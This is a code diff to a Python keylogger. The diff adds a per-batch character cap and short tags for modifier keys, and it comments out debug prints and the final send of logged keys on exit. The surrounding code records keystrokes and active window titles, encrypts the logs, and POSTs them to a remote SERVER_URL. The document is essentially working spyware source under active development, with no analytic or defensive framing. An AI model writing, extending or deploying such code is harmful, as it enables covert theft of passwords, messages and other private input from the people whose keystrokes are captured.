@@ -27,6 +27,7 @@ collected_keys = [] # list to store the accumulated key logs
 countdown_active = False # flag to indicate if the countdown thread is running
 initial_log_time = None # current batch start timestamp
 last_keypress_time = None # last input timestamp (initialized to None, will be set on first keypress)
+MAX_LOG_CHARACTER_LIMIT = 500 # max characters to log in a single batch
 KILL_SWITCH_PHRASE = "keylogger kill"
 kill_buffer = [] # buffer to check for the kill switch phrase
 MAX_KILL_BUFFER_LEN = len(KILL_SWITCH_PHRASE)
@@ -123,7 +124,7 @@ def get_active_window_title():
 
 # record each key press and determine the time
 def on_press(key):
-    global last_keypress_time, countdown_active, initial_log_time
+    global last_keypress_time, countdown_active, initial_log_time, collected_keys, kill_buffer, SYMMETRIC_KEY, PUBLIC_KEY_PEM
 
     # Initialize initial_log_time if this is the first key in a new batch
     if initial_log_time is None:
@@ -143,12 +144,31 @@ def on_press(key):
         elif key == keyboard.Key.tab:
             char_to_log = "\t"
         elif key == keyboard.Key.backspace:
-            char_to_log = "[BACKSPACE]"
+            char_to_log = "[BKSP]"
+        elif key == keyboard.Key.ctrl or key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
+            char_to_log = "[C]"
+        elif key == keyboard.Key.alt or key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
+            char_to_log = "[A]"
+        elif key == keyboard.Key.shift or key == keyboard.Key.shift_l or key == keyboard.Key.shift_r:
+            char_to_log = "[S]"
+        elif key == keyboard.Key.cmd or key == keyboard.Key.cmd_l or key == keyboard.Key.cmd_r:
+            char_to_log = "[CMD]"
+        elif key == keyboard.Key.esc:
+            char_to_log = "[E]"
+        elif key == keyboard.Key.caps_lock:
+            char_to_log = "[CPS]"
+        elif key == keyboard.Key.delete:
+            char_to_log = "[DEL]"
         else:
             # For other misc special keys (e.g., Key.shift, Key.ctrl_l, Key.alt_gr)
             char_to_log = f"[{str(key).replace('Key.', '').upper()}]"
         
         print(char_to_log, end='', flush=True)
+    
+    # limit the number of characters logged in a single batch
+    if len(collected_keys) >= MAX_LOG_CHARACTER_LIMIT:
+        print("\nMax log character limit reached. Removing oldest keys to make space.")
+        collected_keys = collected_keys[-(MAX_LOG_CHARACTER_LIMIT // 2):]
     
     # Add keypress and window title info to collected_keys
     collected_keys.append(char_to_log)
@@ -231,10 +251,10 @@ def send_data_batch():
     }
 
     try:
-        print("Encryped AES key length (bytes):", len(encrypted_aes_key))
-        print("Encrypted AES key (base64) length:", encrypted_aes_key_b64)
-        print("AES key (hex):", SYMMETRIC_KEY.hex())
-        print("Encrypted log content length (bytes):", len(encrypted_log_content))
+        # print("Encryped AES key length (bytes):", len(encrypted_aes_key))
+        # print("Encrypted AES key (base64) length:", encrypted_aes_key_b64)
+        # print("AES key (hex):", SYMMETRIC_KEY.hex())
+        # print("Encrypted log content length (bytes):", len(encrypted_log_content))
         response = requests.post(SERVER_URL, json=data)
         response.raise_for_status()
         print(f"Data sent successfully. Server response: {response.status_code}")
@@ -273,11 +293,11 @@ if __name__ == "__main__":
         print("Keylogger Stopped by User (Ctrl+C).")
         
         # dump any remaining collected keys before exiting
-        if collected_keys:
-            print("Dumping final batch of collected keys...")
-            send_data_batch() # call dump_data_batch for any remaining data
+        # if collected_keys:
+        #     print("Dumping final batch of collected keys...")
+        #     send_data_batch() # call dump_data_batch for any remaining data
         
-        print("-------------------------")
+        # print("-------------------------")
     finally:
         # ensure the listener thread is stopped when the main thread exits
         listener.stop() 
